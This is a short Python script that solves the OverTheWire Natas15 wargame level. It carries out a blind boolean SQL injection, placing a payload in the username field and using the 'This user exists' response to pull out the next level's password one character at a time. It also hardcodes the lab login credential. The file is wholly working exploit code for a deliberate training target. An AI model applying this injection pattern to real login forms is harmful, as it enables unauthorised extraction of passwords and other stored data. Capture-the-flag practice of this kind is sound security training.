import requests
from requests.auth import HTTPBasicAuth

url = "http://natas15.natas.labs.overthewire.org"
auth = HTTPBasicAuth('natas15', 'SdqIqBsFcz3yotlNYErZSZwblkm0lrvx')

# Possible characters in password (alphanumeric)
chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

password = ""

# Extract password character by character
for position in range(1, 50):  # Assuming max 32 chars
    for char in chars:
        # Test if password at this position matches this character
        username = f'natas16" AND password LIKE BINARY "{password}{char}%" -- '
        
        response = requests.post(
            url,
            auth=auth,
            data={'username': username}
        )
        
        if "This user exists" in response.text:
            password += char
            print(f"Found: {password}")
            break
    else:
        # No more characters found
        break

print(f"\nFinal password: {password}")